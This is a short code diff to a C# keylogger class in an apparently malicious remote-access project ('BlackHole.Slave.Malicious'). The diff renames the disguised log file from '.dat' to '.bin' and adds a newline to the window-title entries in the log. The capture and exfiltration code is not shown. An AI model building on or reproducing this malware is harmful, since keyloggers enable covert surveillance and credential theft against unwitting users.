@@ -16,7 +16,7 @@ namespace BlackHole.Slave.Malicious
     /// </summary>
     public class Keylogger : Singleton<Keylogger>, IMalicious
     {
-        private static string FileName = "WinDump_{0}.dat";
+        private static string FileName = "WinDump_{0}.bin";
 
 #if DEBUG
         /// <summary>
@@ -90,7 +90,7 @@ namespace BlackHole.Slave.Malicious
         /// 
         /// </summary>
         private void AppendNewWindowName() =>
-            AppendLine($"[{m_lastWindowTitle}][{DateTime.Now.ToString("HH:mm")}]");
+            AppendLine($"\n[{m_lastWindowTitle}][{DateTime.Now.ToString("HH:mm")}]");
 
         /// <summary>
         /// 
